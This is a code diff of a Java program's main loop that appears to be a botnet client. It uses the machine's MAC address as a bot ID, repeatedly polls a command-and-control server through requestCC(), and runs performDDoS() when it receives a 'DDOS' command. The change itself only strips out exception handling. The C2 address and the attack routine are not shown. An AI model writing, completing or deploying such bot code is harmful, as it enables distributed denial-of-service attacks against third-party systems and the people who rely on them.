@@ -127,47 +127,37 @@ public class Main {
 
 	public static void main(String[] args) throws Exception {
 
-		try {
+		InetAddress inetAddress = InetAddress.getLocalHost();
+		NetworkInterface networkInterface = NetworkInterface.getByInetAddress(inetAddress);
+		byte[] mac = networkInterface.getHardwareAddress();
+		StringBuilder stringBuilder = new StringBuilder();
+		for (int i = 0; i < mac.length; i++) {
+			stringBuilder.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
+		}
+		BOT_ID = stringBuilder.toString();
 
-			InetAddress inetAddress = InetAddress.getLocalHost();
-			NetworkInterface networkInterface = NetworkInterface.getByInetAddress(inetAddress);
-			byte[] mac = networkInterface.getHardwareAddress();
-			StringBuilder stringBuilder = new StringBuilder();
-			for (int i = 0; i < mac.length; i++) {
-				stringBuilder.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
+		if (DEBUG)
+			System.out.println("Bot-ID (MAC address): " + BOT_ID);
+
+		Random random = new Random();
+		
+		// "listen" for command
+		while (true) {
+			Main.requestCC();
+
+			switch (COMMAND) {
+
+			case "DDOS":
+				performDDoS();
+				break;
+
+			default:
+				// just idle around
+				break;
 			}
-			BOT_ID = stringBuilder.toString();
-
-			if (DEBUG)
-				System.out.println("Bot-ID (MAC address): " + BOT_ID);
-
-			Random random = new Random();
-			
-			// "listen" for command
-			while (true) {
-				try {
-					Main.requestCC();
-
-					switch (COMMAND) {
-
-					case "DDOS":
-						performDDoS();
-						break;
-
-					default:
-						// just idle around
-						break;
-					}
-					int randomInt = random.nextInt(45);
-					System.out.println("Sleeping "+randomInt+" seconds");
-					Thread.sleep(randomInt*1000);
-				} catch (Exception e) {
-					e.printStackTrace();
-				}
-			}
-
-		} catch (Exception e) {
-			e.printStackTrace();
+			int randomInt = random.nextInt(45);
+			System.out.println("Sleeping "+randomInt+" seconds");
+			Thread.sleep(randomInt*1000);
 		}
 
 	}
